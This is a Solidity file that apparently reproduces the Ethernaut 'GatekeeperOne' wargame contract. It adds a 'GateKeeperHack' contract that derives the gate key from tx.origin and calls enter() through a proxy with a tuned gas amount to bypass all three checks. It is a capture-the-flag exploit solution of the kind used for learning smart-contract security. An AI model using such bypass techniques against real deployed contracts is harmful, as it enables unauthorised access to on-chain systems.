// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo(){
    require(gasleft().mod(8191) == 0);
     _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) external gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateKeeperHack {
    GatekeeperOne public gatekeeperOne;// = GatekeeperOne(0xdACB2745e20fD5b1D1A28154A66099Ab47CffBC6);

    constructor (GatekeeperOne _gatekeeperOne) public {
        gatekeeperOne = _gatekeeperOne;
    }

    function hack(uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(0xFFFFFFFF0000FFFF) & bytes8(uint64(uint160(tx.origin)));
        (bool ret, ) = address(gatekeeperOne).call.gas(_gas)(abi.encodeWithSignature("enter(bytes8)", key));
        return ret;
    } 
}